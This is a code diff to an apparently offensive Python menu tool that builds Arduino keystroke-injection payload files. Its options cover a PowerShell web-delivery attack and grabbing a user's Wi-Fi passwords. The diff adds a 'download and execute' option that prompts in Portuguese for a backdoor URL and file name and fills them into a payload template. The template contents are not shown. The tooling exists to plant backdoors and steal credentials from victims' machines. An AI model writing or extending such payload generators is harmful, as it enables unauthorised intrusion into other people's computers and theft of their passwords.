@@ -4,7 +4,7 @@ def subpowershellmenu():
     print ("""
     1 - Webdelivery Powershell Attack
     2 - Grabb Wifi's passwords from user
-    3 - Grabb GoogleCrhome passwords from user
+    3 - Powershell Download and execute 
     0 - Back to frist select menu
     """)
 
@@ -21,10 +21,10 @@ def subpowershellmenu():
         filedata = f.read()
         f.close()
         newdata = filedata.replace("WDLVRYPAYLOAD", webdlvrypayload)
-        f = open('out/OUT-WebdeliveryPsh.ino', 'w')
+        f = open('out/OUT-WebdeliveryPsh/OUT-WebdeliveryPsh.ino', 'w')
         f.write(newdata)
         f.close()
-        os.system("start out/OUT-WebdeliveryPsh.ino")
+        os.system("start out/OUT-WebdeliveryPsh/OUT-WebdeliveryPsh.ino")
 
 
 
@@ -45,7 +45,18 @@ def subpowershellmenu():
         os.system("start out/OUT-WifiGrabbpasswordtoMail.ino")
 
     elif submenuselect == "3":
-        print ("Edit ok")
+        newpass = raw_input(str("Digite o link do backdoor : "))
+        backdoor = raw_input(str("Digite o nome do arquivo : "))
+        print (newpass)
+
+        f = open('payloads/Psdownandexecute.ino', 'r')
+        filedata = f.read()
+        f.close()
+        newdata = filedata.replace("HOST", newpass).replace("PAYLOAD", backdoor)
+        f = open('out/OUT-Psdownandexecute.ino', 'w')
+        f.write(newdata)
+        f.close()
+        os.system("start out/OUT-Psdownandexecute.ino")
 
 
 
